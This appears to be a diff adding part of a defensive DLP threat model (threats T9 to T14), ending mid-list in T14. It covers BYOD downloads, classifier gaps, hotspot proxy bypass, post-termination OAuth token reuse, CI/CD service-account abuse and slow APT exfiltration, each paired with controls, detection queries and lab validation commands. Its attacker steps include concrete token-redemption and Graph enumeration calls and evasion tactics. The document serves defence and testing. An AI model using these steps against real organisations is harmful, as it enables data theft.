+<hr />
+<h3 id="t9-byod-device-exfiltration-via-authorized-saas-session">T9 — BYOD Device Exfiltration via Authorized SaaS Session</h3>
+<p><strong>STRIDE category:</strong> Information Disclosure<br />
+<strong>Risk:</strong> High likelihood, High impact<br />
+<strong>Attacker objective:</strong> Access corporate SaaS (SharePoint, Google Drive, Teams) from a personal unmanaged device where no endpoint DLP agent is installed, then copy files to local storage — completely bypassing all endpoint-level controls.</p>
+<h4 id="how-the-attacker-would-exploit-it_8">How the attacker would exploit it</h4>
+<ul>
+<li><strong>Prerequisite:</strong> Employee uses a personal laptop or mobile device with authenticated access to corporate SaaS (BYOD policy allows this or Conditional Access is misconfigured).</li>
+<li><strong>Step 1:</strong> Employee (or attacker who has compromised the account) signs into SharePoint or Google Drive from a personal device — the device has no Intune enrollment and no DLP agent.</li>
+<li><strong>Step 2:</strong> Downloads sensitive files via the browser download function — CASB may inspect if roaming client is installed on the personal device, but BYOD typically excludes the roaming client requirement.</li>
+<li><strong>Step 3:</strong> Files land on personal device storage — no corporate DLP visibility into what happens to the file after download.</li>
+<li><strong>Step 4:</strong> Personal device can sync to personal iCloud, Google Photos, or local backup — further proliferating data outside corporate control.</li>
+<li><strong>Step 5:</strong> Impact: all endpoint DLP controls provide zero coverage; only CASB network-layer controls apply, and only if the BYOD device is routing through the corporate proxy.</li>
+</ul>
+<h4 id="blue-team-control-review-what-must-stop-the-chain_8">Blue-team control review — what must stop the chain</h4>
+<ul>
+<li><strong>Control 1:</strong> Conditional Access policy: require <code>device.isCompliant = true</code> for all access to CONFIDENTIAL-classified SharePoint sites, Teams channels, and HR/Finance applications — unmanaged BYOD devices are blocked at authentication, never reaching the download step.</li>
+<li><strong>Control 2:</strong> Browser isolation (Remote Browser Isolation via Zscaler or Menlo Security) for BYOD accessing sensitive SaaS: files are rendered in a cloud browser — no download to local device possible; copy-paste of sensitive content is restricted.</li>
+<li><strong>Control 3:</strong> Azure AD session policy (enforced by Defender for Cloud Apps): for unmanaged devices, session control limits file downloads to zero for CONFIDENTIAL/RESTRICTED sites — view-only rendering in browser.</li>
+<li><strong>Control 4:</strong> Entra ID Sign-in Logs: <code>DeviceDetail.isCompliant = false</code>, <code>DeviceDetail.isManaged = false</code> on access to CONFIDENTIAL SharePoint — alert for investigation even when access is blocked.</li>
+<li><strong>Control 5:</strong> Enforce <code>AppEnforcedRestrictions</code> in Conditional Access for SharePoint: forces SharePoint to apply limited-experience mode (no download, no sync) for non-compliant devices.</li>
+</ul>
+<h4 id="evidence-and-telemetry-to-validate-controls_8">Evidence and telemetry to validate controls</h4>
+<ul>
+<li>Entra ID Sign-in Logs: <code>DeviceDetail.TrustType = null</code>, <code>DeviceDetail.isCompliant = false</code>, <code>ResourceDisplayName = SharePoint Online</code>, <code>ConditionalAccessStatus = failure</code> — confirms policy blocked the access.</li>
+<li>SharePoint Unified Audit Log: <code>Operation = FileDownloaded</code>, <code>UserAgent</code> without corporate MDM enrollment indicator — signal for unmanaged device access that bypassed Conditional Access (misconfiguration indicator).</li>
+<li>Defender for Cloud Apps: <code>DeviceType = Unmanaged</code>, <code>ActivityType = Download</code>, <code>AppName = SharePoint or Teams</code> — session control enforcement events.</li>
+</ul>
+<h4 id="purple-team-validation-commands_8">Purple-team validation commands</h4>
+<pre><code class="language-powershell"># Validate Conditional Access blocks unmanaged device access to SharePoint
+# Run in Entra ID PowerShell (authorized lab - requires test unmanaged device)
+# Step 1: Attempt SharePoint access from a device with no Intune enrollment
+# Step 2: Verify Conditional Access evaluation result
+Get-MgAuditLogSignIn -Filter &quot;userDisplayName eq '&lt;testuser&gt;'&quot; -Top 5 |
+  Select-Object CreatedDateTime, ConditionalAccessStatus, DeviceDetail, ResourceDisplayName
+# Expected: ConditionalAccessStatus = failure for access from non-compliant device to CONFIDENTIAL sites
+</code></pre>
+<h4 id="attack-tree-with-control-breakpoints_8">Attack tree with control breakpoints</h4>
+<pre class="mermaid">
+flowchart TD
+    A1[Employee or attacker accesses SharePoint from personal BYOD device]:::attack
+    A1 --> C1{Conditional Access requires compliant managed device?}:::control
+    C1 -->|Yes| B1[BYOD access blocked at authentication - cannot reach data]:::blocked
+    C1 -->|No - policy gap| A2[BYOD device gets authenticated SharePoint session]:::attack
+    A2 --> C2{AppEnforcedRestrictions or session control blocks download?}:::control
+    C2 -->|Yes| B2[View-only mode - no download to local disk possible]:::blocked
+    C2 -->|No| A3[Files downloaded to personal device with no DLP agent]:::attack
+    A3 --> C3{Remote Browser Isolation prevents local file save?}:::control
+    C3 -->|Yes| B3[Files rendered in cloud browser - never touch local disk]:::blocked
+    C3 -->|No| A4[Sensitive files on personal device - corporate DLP has zero visibility]:::impact
+
+    classDef attack fill:#ffe6e6,stroke:#cc0000,color:#111;
+    classDef control fill:#e6f2ff,stroke:#0066cc,color:#111;
+    classDef blocked fill:#e8f5e9,stroke:#1b5e20,color:#111;
+    classDef impact fill:#fff3cd,stroke:#b8860b,color:#111;
+</pre>
+<hr />
+<h3 id="t10-auto-classification-false-negative">T10 — Auto-Classification False Negative</h3>
+<p><strong>STRIDE category:</strong> Information Disclosure<br />
+<strong>Risk:</strong> High likelihood, Medium impact<br />
+<strong>Attacker objective:</strong> Exploit gaps in the auto-classification engine — novel file formats, scanned PDFs, images with embedded PII, or new internal codenames not in the training corpus — so that sensitive data is transmitted without a classification label and DLP policies never fire.</p>
+<h4 id="how-the-attacker-would-exploit-it_9">How the attacker would exploit it</h4>
+<ul>
+<li><strong>Prerequisite:</strong> The DLP policy is label-dependent — files without a classification label default to INTERNAL and are subject to fewer restrictions than CONFIDENTIAL/RESTRICTED.</li>
+<li><strong>Step 1:</strong> Identify file types or content patterns the classifier misses: scanned PDFs (image-only, no text layer), Excel files with PII in unconventional columns, new product codenames not yet in the classifier training set.</li>
+<li><strong>Step 2:</strong> Save or export sensitive data in a format that will not trigger auto-classification (e.g., export financial model as CSV without headers, screenshot financial data into a PNG image file).</li>
+<li><strong>Step 3:</strong> Transmit the unclassified file — because it is labeled INTERNAL (or not labeled at all), the DLP policy allows the transfer without block or alert.</li>
+<li><strong>Step 4:</strong> No DLP incident ticket is generated; no CASB block event; no email quarantine. The transfer appears as normal INTERNAL data movement.</li>
+<li><strong>Step 5:</strong> Impact: estimated 8–15% miss rate on unstructured data means a meaningful fraction of actual sensitive content exits with zero DLP enforcement.</li>
+</ul>
+<h4 id="blue-team-control-review-what-must-stop-the-chain_9">Blue-team control review — what must stop the chain</h4>
+<ul>
+<li><strong>Control 1:</strong> Mandatory human labeling for RESTRICTED tier — no auto-classification allowed; all RESTRICTED files must receive a manual label from the document owner before saving, enforced by the Purview labeling SDK (<code>MandatoryLabelForDocuments = true</code>).</li>
+<li><strong>Control 2:</strong> OCR pre-processing pipeline for scanned PDFs and images before DLP classification — Azure Cognitive Services or Tesseract OCR applied to all uploaded image files and PDFs before CASB content inspection.</li>
+<li><strong>Control 3:</strong> Quarterly classifier retraining with gold-standard labeled corpus — measure precision/recall per file type; target &gt; 90% recall for PII content in top 10 file extensions; new internal codenames added to training data within 30 days of introduction.</li>
+<li><strong>Control 4:</strong> Honeyfile strategy: plant uniquely identifiable RESTRICTED-labeled bait files in all sensitive repositories — any transmission of a honeyfile generates P0 alert regardless of DLP classification match (the honeyfile is its own sensor).</li>
+<li><strong>Control 5:</strong> Treat ALL outbound files over 5MB to external destinations without a classification label as HIGH risk — alert for human review rather than silently allowing unclassified large file transfers.</li>
+</ul>
+<h4 id="evidence-and-telemetry-to-validate-controls_9">Evidence and telemetry to validate controls</h4>
+<ul>
+<li>DLP incident queue: <code>PolicyMatch = false</code> on large outbound files — analyze pattern of near-misses to identify classifier blind spots.</li>
+<li>CASB upload logs: <code>content_label = null or INTERNAL</code> on files with <code>.pdf</code>, <code>.csv</code>, <code>.xlsx</code> extensions above 1MB threshold — flag for periodic human review even without policy match.</li>
+<li>Purview classification coverage report: percentage of files in CONFIDENTIAL/RESTRICTED SharePoint sites that have no label assigned — this number should be &lt; 5% for mature programs.</li>
+<li>Quarterly classifier evaluation: precision and recall metrics per file type from gold-standard test corpus; alert if recall drops below 85% for any PII content type.</li>
+</ul>
+<h4 id="purple-team-validation-commands_9">Purple-team validation commands</h4>
+<pre><code class="language-powershell"># Validate mandatory labeling policy is configured for RESTRICTED sites
+Get-DlpCompliancePolicy | Where-Object { $_.Name -like &quot;*Restricted*&quot; } |
+  Select-Object Name, ExchangeLocation, SharePointLocation, Enabled
+
+# Check percentage of unlabeled files in CONFIDENTIAL SharePoint sites
+# (Use SharePoint CSOM or PnP PowerShell in authorized lab)
+# Expected: MandatoryLabelForDocuments = true; unlabeled files &lt; 5% of site inventory
+</code></pre>
+<pre><code class="language-kql">// KQL: Identify large unclassified files transmitted to external destinations
+// Source: CASB upload logs
+McasShadowItReporting
+| where ActivityType == &quot;Upload&quot;
+| where isempty(SensitivityLabel) or SensitivityLabel == &quot;General&quot; or SensitivityLabel == &quot;Internal&quot;
+| where BytesUploaded &gt; 5242880  // 5MB
+| where AppCategory in (&quot;Personal Cloud Storage&quot;, &quot;File Sharing&quot;, &quot;Email&quot;)
+| project TimeGenerated, UserId, AppName, BytesUploaded, SensitivityLabel, FileName
+| order by BytesUploaded desc
+</code></pre>
+<h4 id="attack-tree-with-control-breakpoints_9">Attack tree with control breakpoints</h4>
+<pre class="mermaid">
+flowchart TD
+    A1[Attacker exports RESTRICTED financial data as unlabeled CSV or scanned PDF]:::attack
+    A1 --> C1{Mandatory human labeling required for RESTRICTED-tier documents?}:::control
+    C1 -->|Yes| B1[User cannot save without applying RESTRICTED label - intent detected]:::blocked
+    C1 -->|No - auto-label only| A2[File saved without label - defaults to INTERNAL]:::attack
+    A2 --> A3[File transmitted via email or browser upload]:::attack
+    A3 --> C2{DLP policy inspects INTERNAL-tier files for PII content patterns?}:::control
+    C2 -->|Yes - OCR and content scan| B2[PII pattern match fires DLP block even without label]:::blocked
+    C2 -->|No - label-gated only| A4[File passes all DLP gates with zero incident telemetry]:::attack
+    A4 --> C3{Honeyfile or unclassified-large-file alert catches transmission?}:::control
+    C3 -->|Yes| B3[Analyst reviews and escalates to IR]:::blocked
+    C3 -->|No| A5[RESTRICTED data exits with no DLP record - regulator cannot be notified correctly]:::impact
+
+    classDef attack fill:#ffe6e6,stroke:#cc0000,color:#111;
+    classDef control fill:#e6f2ff,stroke:#0066cc,color:#111;
+    classDef blocked fill:#e8f5e9,stroke:#1b5e20,color:#111;
+    classDef impact fill:#fff3cd,stroke:#b8860b,color:#111;
+</pre>
+<hr />
+<h3 id="t11-mobile-hotspot-casb-proxy-bypass">T11 — Mobile Hotspot CASB Proxy Bypass</h3>
+<p><strong>STRIDE category:</strong> Information Disclosure<br />
+<strong>Risk:</strong> High likelihood, High impact<br />
+<strong>Attacker objective:</strong> Disconnect a managed corporate laptop from the corporate network and reconnect via a personal mobile hotspot, causing all traffic to route directly to the internet — bypassing the CASB inline proxy entirely while the endpoint DLP agent and roaming client may still be running but non-functional for cloud-path inspection.</p>
+<h4 id="how-the-attacker-would-exploit-it_10">How the attacker would exploit it</h4>
+<ul>
+<li><strong>Prerequisite:</strong> Employee has a personal smartphone with mobile data and the ability to create a hotspot; managed laptop is enrolled in Intune but CASB roaming client enforcement is not validated continuously.</li>
+<li><strong>Step 1:</strong> Disconnect managed laptop from corporate Wi-Fi or VPN; connect to personal mobile hotspot — laptop now has direct internet access with no CASB proxy in the path.</li>
+<li><strong>Step 2:</strong> If the CASB roaming client (Netskope or Zscaler App) has been uninstalled, disabled, or killed by the user (requires admin privileges on some configurations), all traffic bypasses the CASB completely.</li>
+<li><strong>Step 3:</strong> Upload sensitive files to personal Dropbox or Google Drive — no CASB TLS inspection, no category block, no content scan. Traffic looks like normal consumer HTTPS to the cloud provider.</li>
+<li><strong>Step 4:</strong> DNS category block is also bypassed if the roaming DNS resolver is not enforced — user can resolve <code>dropbox.com</code> directly via mobile carrier DNS.</li>
+<li><strong>Step 5:</strong> Impact: the CASB-dependent control tier is completely eliminated; only endpoint DLP agent file-level hooks remain as a control, and those only catch file writes to USB or print — not browser-based uploads.</li>
+</ul>
+<h4 id="blue-team-control-review-what-must-stop-the-chain_10">Blue-team control review — what must stop the chain</h4>
+<ul>
+<li><strong>Control 1:</strong> CASB roaming client enforced via Intune Compliance Policy — <code>roaming_client_active = true</code> is a required compliance condition; non-compliant devices are blocked from accessing CONFIDENTIAL SharePoint and Exchange via Conditional Access.</li>
+<li><strong>Control 2:</strong> Endpoint DLP agent browser extension (Microsoft Purview Endpoint DLP browser extension for Chrome/Edge) intercepts browser upload events at the browser API level — active even when the CASB proxy is not in the path.</li>
+<li><strong>Control 3:</strong> Conditional Access Network Location policy: access to CONFIDENTIAL sites requires either (a) corporate network/VPN or (b) confirmed CASB roaming client heartbeat within the last 15 minutes — mobile hotspot with no roaming client = no access.</li>
+<li><strong>Control 4:</strong> SIEM alert: CASB roaming client heartbeat for managed device absent for more than 15 minutes during business hours → Medium alert; device accesses CONFIDENTIAL resources while heartbeat is absent → Critical alert.</li>
+<li><strong>Control 5:</strong> Tamper protection on CASB roaming client via Intune: prevent user-mode uninstall of the roaming client; require Intune wipe for removal — ensures agent continuity on managed devices.</li>
+</ul>
+<h4 id="evidence-and-telemetry-to-validate-controls_10">Evidence and telemetry to validate controls</h4>
+<ul>
+<li>CASB agent telemetry: <code>DeviceId</code>, <code>LastHeartbeat</code>, <code>AgentVersion</code>, <code>PolicyStatus = active/inactive</code> — reconcile against Intune device inventory daily.</li>
+<li>Intune Device Compliance: <code>ComplianceState</code>, <code>LastSyncDateTime</code>, <code>NonComplianceReasons</code> — filter for reason = <code>CASBClientNotRunning</code>.</li>
+<li>Entra ID Conditional Access: sign-in events with <code>ConditionalAccessStatus = failure</code> and <code>FailureReason = DeviceNotCompliant</code> on CONFIDENTIAL resource access — confirms the control is blocking.</li>
+<li>Network Connection Events (MDE): <code>DeviceNetworkEvents</code> — device connecting to non-corporate SSID followed by access to personal cloud storage domains.</li>
+</ul>
+<h4 id="purple-team-validation-commands_10">Purple-team validation commands</h4>
+<pre><code class="language-powershell"># Validate CASB roaming client compliance requirement in Intune
+# Check which compliance policies require CASB heartbeat
+Get-MgDeviceManagementDeviceCompliancePolicy |
+  Where-Object { $_.DisplayName -like &quot;*CASB*&quot; -or $_.DisplayName -like &quot;*Netskope*&quot; -or $_.DisplayName -like &quot;*Zscaler*&quot; } |
+  Select-Object DisplayName, ScheduledActionsForRule
+</code></pre>
+<pre><code class="language-kql">// KQL: Detect managed device with CASB client offline accessing sensitive resources
+// Source: Custom CASB heartbeat table + SigninLogs
+let CASBOfflineDevices = CASBHeartbeat  // custom table from CASB telemetry export
+| where AgentActive == false
+| where LastHeartbeat &lt; ago(15m)
+| project DeviceId, DeviceName, LastHeartbeat;
+SigninLogs
+| where ResourceDisplayName in (&quot;SharePoint Online&quot;, &quot;Microsoft Teams&quot;, &quot;Exchange Online&quot;)
+| where DeviceDetail.isCompliant == true  // managed device but CASB might be off
+| join kind=inner CASBOfflineDevices on $left.DeviceDetail.deviceId == $right.DeviceId
+| project TimeGenerated, UserPrincipalName, DeviceName, ResourceDisplayName, LastHeartbeat
+</code></pre>
+<h4 id="attack-tree-with-control-breakpoints_10">Attack tree with control breakpoints</h4>
+<pre class="mermaid">
+flowchart TD
+    A1[Attacker disconnects from corporate WiFi - connects via mobile hotspot]:::attack
+    A1 --> C1{CASB roaming client still active - routing traffic through CASB?}:::control
+    C1 -->|Yes| B1[CASB TLS inspection still active on hotspot traffic]:::blocked
+    C1 -->|No - agent disabled or killed| A2[All traffic routes direct to internet - no CASB inspection]:::attack
+    A2 --> C2{Conditional Access blocks CONFIDENTIAL access without CASB heartbeat?}:::control
+    C2 -->|Yes| B2[Cannot access SharePoint CONFIDENTIAL - no data to exfiltrate]:::blocked
+    C2 -->|No| A3[Accesses SharePoint and bulk downloads via hotspot without CASB]:::attack
+    A3 --> C3{Endpoint DLP browser extension blocks browser-based upload?}:::control
+    C3 -->|Yes| B3[Browser extension fires DLP block on upload to personal cloud]:::blocked
+    C3 -->|No| A4[Files uploaded to personal cloud with zero CASB or proxy telemetry]:::impact
+
+    classDef attack fill:#ffe6e6,stroke:#cc0000,color:#111;
+    classDef control fill:#e6f2ff,stroke:#0066cc,color:#111;
+    classDef blocked fill:#e8f5e9,stroke:#1b5e20,color:#111;
+    classDef impact fill:#fff3cd,stroke:#b8860b,color:#111;
+</pre>
+<hr />
+<h3 id="t12-post-termination-oauth-token-reuse">T12 — Post-Termination OAuth Token Reuse</h3>
+<p><strong>STRIDE category:</strong> Spoofing, Information Disclosure<br />
+<strong>Risk:</strong> Medium likelihood, High impact<br />
+<strong>Attacker objective:</strong> Use a previously granted OAuth refresh token after the granting user's employment has been terminated — accessing corporate data via the Microsoft Graph API using an authorized-looking token with no active user session to trigger identity-based controls.</p>
+<h4 id="how-the-attacker-would-exploit-it_11">How the attacker would exploit it</h4>
+<ul>
+<li><strong>Prerequisite:</strong> A refresh token was issued to an OAuth application (T6) or held by the attacker before the user's termination; HR SCIM provisioning to IdP has a sync delay or automated token revocation was not implemented.</li>
+<li><strong>Step 1:</strong> Attacker uses stored refresh token to call <code>POST https://login.microsoftonline.com/&lt;tenant&gt;/oauth2/v2.0/token</code> with <code>grant_type=refresh_token</code> — if the token has not been revoked, a new access token is issued.</li>
+<li><strong>Step 2:</strong> Uses the new access token to enumerate and download SharePoint files: <code>GET https://graph.microsoft.com/v1.0/sites/&lt;site&gt;/drive/root/children?$top=999</code>.</li>
+<li><strong>Step 3:</strong> Token refresh and API calls look like normal application traffic — no human login event, no suspicious IP, no unusual device — bypasses most behavioral-anomaly detection tuned to human sign-in patterns.</li>
+<li><strong>Step 4:</strong> Since the user account is disabled, email-based MFA challenges cannot be sent — the token is the only authentication factor and it was already granted before termination.</li>
+<li><strong>Step 5:</strong> Impact: post-employment data access continues indefinitely until the token is explicitly revoked; attacker can harvest data across all resources the original user had access to.</li>
+</ul>
+<h4 id="blue-team-control-review-what-must-stop-the-chain_11">Blue-team control review — what must stop the chain</h4>
+<ul>
+<li><strong>Control 1:</strong> Automated immediate token revocation at HR termination event: SCIM provisioning to Entra ID triggers <code>Revoke-MgUserSignInSession</code> and disabling of all refresh tokens within 2 minutes of HR system status change to TERMINATED.</li>
+<li><strong>Control 2:</strong> Token lifetime policy: <code>refreshTokenMaxInactiveTime = 8h</code>, <code>maxRefreshTokenAge = 24h</code> — limits the window an unrevoked token remains valid; reduces blast radius if automated revocation fails.</li>
+<li><strong>Control 3:</strong> SIEM alert: OAuth token refresh for user where <code>HR_status = TERMINATED</code> and <code>termination_date &lt;= event_timestamp</code> → Critical P1 alert; SOAR revokes all tokens immediately.</li>
+<li><strong>Control 4:</strong> IdP lifecycle automation: HR termination event triggers SOAR playbook that calls Graph API to disable account AND revoke tokens AND revoke all OAuth delegated permissions for that user within 2 minutes.</li>
+<li><strong>Control 5:</strong> Quarterly OAuth token audit: enumerate all active refresh tokens per user; identify tokens issued to users whose accounts are disabled — these represent orphaned token risk.</li>
+</ul>
+<h4 id="evidence-and-telemetry-to-validate-controls_11">Evidence and telemetry to validate controls</h4>
+<ul>
+<li>Entra ID SigninLogs: <code>AuthenticationMethod = RefreshToken</code>, <code>UserPrincipalName</code> cross-referenced with HR SCIM event log showing TERMINATED status, <code>ApplicationId</code>.</li>
+<li>Entra ID AuditLogs: <code>ActivityType = Revoke user sign-in sessions</code> — confirms SOAR successfully executed revocation; absence of this event after termination is the finding.</li>
+<li>HR SCIM provisioning logs: <code>event_type = UserTerminated</code>, <code>timestamp</code>, <code>sync_status</code> — measures SCIM sync latency (target: &lt; 2 minutes from HR system event to IdP disable).</li>
+<li>Microsoft Graph activity logs: API calls by <code>AppId</code> for a disabled user — any successful Graph API call post-account-disable indicates token revocation failure.</li>
+</ul>
+<h4 id="purple-team-validation-commands_11">Purple-team validation commands</h4>
+<pre><code class="language-powershell"># Validate that token revocation is triggered at account disable
+# (Authorized lab: create test user, disable account, verify all tokens revoked)
+# Step 1: Check active refresh tokens for a test user
+Get-MgUserSignInActivity -UserId &quot;&lt;testuser@lab-tenant&gt;.onmicrosoft.com&quot; |
+  Select-Object LastSignInDateTime, LastNonInteractiveSignInDateTime
+
+# Step 2: Disable user account (simulates offboarding)
+Update-MgUser -UserId &quot;&lt;testuser&gt;&quot; -AccountEnabled $false
+
+# Step 3: Verify token revocation event appears in audit log within 2 minutes
+Get-MgAuditLogDirectoryAudit -Filter &quot;activityDisplayName eq 'Revoke user sign-in sessions'&quot; -Top 5
+# Expected: Revocation event appears within 2 minutes of account disable
+</code></pre>
+<pre><code class="language-kql">// KQL: Detect post-termination OAuth token refresh
+// Source: SigninLogs + custom HR termination events table
+let terminatedUsers = HRTerminationEvents  // custom table from HR SCIM feed
+| where TerminationDate &lt;= now()
+| project UserPrincipalName, TerminationDate;
+SigninLogs
+| where AuthenticationRequirement == &quot;singleFactorAuthentication&quot;
+| where TokenIssuerType == &quot;AzureAD&quot;
+| join kind=inner terminatedUsers on UserPrincipalName
+| where TimeGenerated &gt; TerminationDate
+| project TimeGenerated, UserPrincipalName, AppDisplayName, IPAddress, TerminationDate
+| order by TimeGenerated desc
+</code></pre>
+<h4 id="attack-tree-with-control-breakpoints_11">Attack tree with control breakpoints</h4>
+<pre class="mermaid">
+flowchart TD
+    A1[Attacker holds OAuth refresh token from pre-termination period]:::attack
+    A1 --> A2[Employee is terminated - HR marks status as TERMINATED]:::attack
+    A2 --> C1{Automated SCIM provisioning revokes all tokens within 2 min?}:::control
+    C1 -->|Yes| B1[Token revoked - refresh attempt returns 401 Unauthorized]:::blocked
+    C1 -->|No - SCIM delay or gap| A3[Refresh token still valid after termination]:::attack
+    A3 --> A4[Attacker uses token to call Graph API and download SharePoint files]:::attack
+    A4 --> C2{SIEM detects token refresh for TERMINATED user and alerts?}:::control
+    C2 -->|Yes| B2[SOAR revokes tokens immediately - P1 investigation opened]:::blocked
+    C2 -->|No| A5[Post-termination data harvest via Graph API persists for weeks]:::impact
+
+    classDef attack fill:#ffe6e6,stroke:#cc0000,color:#111;
+    classDef control fill:#e6f2ff,stroke:#0066cc,color:#111;
+    classDef blocked fill:#e8f5e9,stroke:#1b5e20,color:#111;
+    classDef impact fill:#fff3cd,stroke:#b8860b,color:#111;
+</pre>
+<hr />
+<h3 id="t13-cicd-service-account-bulk-data-exfiltration">T13 — CI/CD Service Account Bulk Data Exfiltration</h3>
+<p><strong>STRIDE category:</strong> Information Disclosure<br />
+<strong>Risk:</strong> Medium likelihood, High impact<br />
+<strong>Attacker objective:</strong> Compromise or abuse an over-privileged CI/CD pipeline service account with <code>Files.ReadWrite.All</code> or <code>Sites.FullControl</code> permissions to bulk-download sensitive data via automated API calls — blending in with normal pipeline activity and bypassing all DLP controls scoped to human user behavior.</p>
+<h4 id="how-the-attacker-would-exploit-it_12">How the attacker would exploit it</h4>
+<ul>
+<li><strong>Prerequisite:</strong> A CI/CD pipeline (GitHub Actions, Azure DevOps, Jenkins) has a service account or managed identity with broad SharePoint or OneDrive permissions for legitimate deployment tasks.</li>
+<li><strong>Step 1:</strong> Attacker compromises the service account credential (stolen PAT from CI/CD environment variable leak, GitHub Actions secret exfiltration via <code>actions/checkout</code> token exposure).</li>
+<li><strong>Step 2:</strong> Uses the service account token to call <code>GET https://graph.microsoft.com/v1.0/sites/&lt;site&gt;/drive/root/children?$top=999</code> repeatedly — bulk-downloading files across multiple SharePoint sites.</li>
+<li><strong>Step 3:</strong> Traffic appears as normal pipeline activity — service account <code>user agent: GitHub-Actions/*, AzureDevOps/*</code> — no human identity, no behavioral baseline comparison against a known user.</li>
+<li><strong>Step 4:</strong> DLP policies often exclude service accounts explicitly to avoid false-positive DLP incidents during legitimate deployments — this exclusion creates a deliberate blind spot.</li>
+<li><strong>Step 5:</strong> Impact: bulk exfiltration indistinguishable from legitimate pipeline operation; no DLP incident queue entry; no CASB block (service accounts often excluded from inline inspection).</li>
+</ul>
+<h4 id="blue-team-control-review-what-must-stop-the-chain_12">Blue-team control review — what must stop the chain</h4>
+<ul>
+<li><strong>Control 1:</strong> Principle of least privilege for service accounts: CI/CD pipelines should have <code>Sites.Selected</code> scope (specific site permissions only) rather than <code>Sites.FullControl</code> or <code>Files.ReadWrite.All</code>; restrict via Microsoft 365 Sites.Selected API.</li>
+<li><strong>Control 2:</strong> Service account activity baseline: alert when service account download volume exceeds P99 of historical baseline for that pipeline — expected pipeline behavior is bounded and predictable.</li>
+<li><strong>Control 3:</strong> DLP policies must NOT blanket-exclude service accounts — instead apply specific policy exceptions only to the minimum required operations with explicit scope.</li>
+<li><strong>Control 4:</strong> PAT and secret rotation: CI/CD PATs expire after 90 days maximum; stored as Azure Key Vault secrets or GitHub Encrypted Secrets — never in environment variables or code; SIEM alerts on secret access outside pipeline execution hours.</li>
+<li><strong>Control 5:</strong> Network controls: service accounts should only be callable from specific pipeline runner IPs or managed identities — any API call from outside the expected source IP range triggers alert.</li>
+</ul>
+<h4 id="evidence-and-telemetry-to-validate-controls_12">Evidence and telemetry to validate controls</h4>
+<ul>
+<li>SharePoint Unified Audit Log: <code>UserId = &lt;service-account&gt;</code>, <code>Operation = FileDownloaded</code>, bulk events — compare against historical baseline download count for that pipeline.</li>
+<li>Azure AD SigninLogs: service principal sign-in events with <code>IPAddress</code> outside expected pipeline runner IP range.</li>
+<li>GitHub/Azure DevOps audit logs: PAT or service account credential last used timestamp, source IP, <code>repository</code> or <code>pipeline</code> context.</li>
+<li>Microsoft Defender for Cloud Apps: anomaly detection policy for service accounts — <code>ActivityType = Download</code>, <code>AppId = &lt;pipeline-service-account&gt;</code>, volume spike versus 30-day baseline.</li>
+</ul>
+<h4 id="purple-team-validation-commands_12">Purple-team validation commands</h4>
+<pre><code class="language-powershell"># Validate service account SharePoint permissions are scoped to Sites.Selected
+# Run in SharePoint PnP PowerShell (authorized lab)
+Get-PnPAzureADAppSitePermission -Site &quot;https://&lt;tenant&gt;.sharepoint.com/sites/&lt;sensitive-site&gt;&quot;
+# Expected: service account app registration listed with Site.Selected permission
+# Finding: if Sites.FullControl or Files.ReadWrite.All is shown, over-privilege exists
+
+# Check for service accounts excluded from DLP policies
+Get-DlpCompliancePolicy | Select-Object Name, ExchangeSenderMemberOf |
+  Where-Object { $_.ExchangeSenderMemberOf -ne $null }
+</code></pre>
+<h4 id="attack-tree-with-control-breakpoints_12">Attack tree with control breakpoints</h4>
+<pre class="mermaid">
+flowchart TD
+    A1[Attacker steals CI/CD service account PAT or OAuth token]:::attack
+    A1 --> C1{Service account scoped to Sites.Selected - not Sites.FullControl?}:::control
+    C1 -->|Yes| B1[API calls only reach permitted sites - blast radius limited]:::blocked
+    C1 -->|No - Sites.FullControl| A2[Attacker calls Graph API and bulk-downloads all SharePoint sites]:::attack
+    A2 --> C2{DLP policy covers service account activity - not blanket excluded?}:::control
+    C2 -->|Yes| B2[DLP volume threshold fires for service account download spike]:::blocked
+    C2 -->|No - service account excluded| A3[Download volume unlimited with no DLP telemetry]:::attack
+    A3 --> C3{SIEM baseline anomaly detects download volume spike vs P99?}:::control
+    C3 -->|Yes| B3[Alert fires - pipeline account investigated and PAT rotated]:::blocked
+    C3 -->|No| A4[Bulk data exfiltration via API indistinguishable from normal pipeline traffic]:::impact
+
+    classDef attack fill:#ffe6e6,stroke:#cc0000,color:#111;
+    classDef control fill:#e6f2ff,stroke:#0066cc,color:#111;
+    classDef blocked fill:#e8f5e9,stroke:#1b5e20,color:#111;
+    classDef impact fill:#fff3cd,stroke:#b8860b,color:#111;
+</pre>
+<hr />
+<h3 id="t14-nation-state-slow-exfiltration-below-volume-thresholds">T14 — Nation-State Slow Exfiltration Below Volume Thresholds</h3>
+<p><strong>STRIDE category:</strong> Information Disclosure<br />
+<strong>Risk:</strong> Low likelihood, Critical impact<br />
+<strong>Attacker objective:</strong> An APT actor with long-dwell access exfiltrates 1–5 carefully selected files per day over months, staying deliberately below all volume-based DLP and SIEM detection thresholds while using authorized-looking access patterns to blend with normal user behavior.</p>
+<h4 id="how-the-attacker-would-exploit-it_13">How the attacker would exploit it</h4>
+<ul>
+<li><strong>Prerequisite:</strong> Attacker has persistent access via a compromised account, a long-lived OAuth token, or a persistent endpoint implant with legitimate user credential access.</li>
+<li><strong>Step 1:</strong> Conduct careful reconnaissance using BloodHound-equivalent file-system mapping to identify the specific high-value files (M&amp;A targets, source code repositories, trade secret documents) rather than bulk-downloading everything.</li>
+<li><strong>Step 2:</strong> Download 1–3 files per day during normal business hours from a geographically plausible IP — below every volume threshold (&lt; 10MB/day).</li>
+<li><strong>Step 3:</strong> Exfiltrate via a sanctioned cloud sync client (OneDrive for Business sync to a compromised account, SharePoint sync client) so the traffic looks like normal authorized sync rather than a discrete upload event.</li>
+<li><strong>Step 4:</strong> Rotate exfiltration methods: day 1 email attachment, day 2 OneDrive sync, day 3 USB — making correlation across channels harder.</li>
+<li><strong>Step 5:</strong> Impact: over 6–12 months, entire M&amp;A deal file, source code repository, or product roadmap is exfiltrated one file at a time — no single event ever crosses a detection threshold.</li>
+</ul>
+<h4 id="blue-team-control-review-what-must-stop-the-chain_13">Blue-team control review — what must stop the chain</h4>
+<ul>
+<li><strong>Control 1:</strong> UEBA with 90-day behavioral baseline: detect gradual behavioral drift rather than threshold spikes — a user who downloads 3 files/day for 6 months when their baseline is 0.3 files/day is a 10x anomaly detectable only by UEBA, not flat thresholds.</li>
+<li><strong>Control 2:</strong> Honeyfile strategy: plant uniquely identifiable RESTRICTED-labeled canary documents in all sensitive repositories with embedded tracking tokens — <strong>any</strong> access to a honeyfile triggers P0 alert regardless of volume, completely bypassing threshold-based detection.</li>
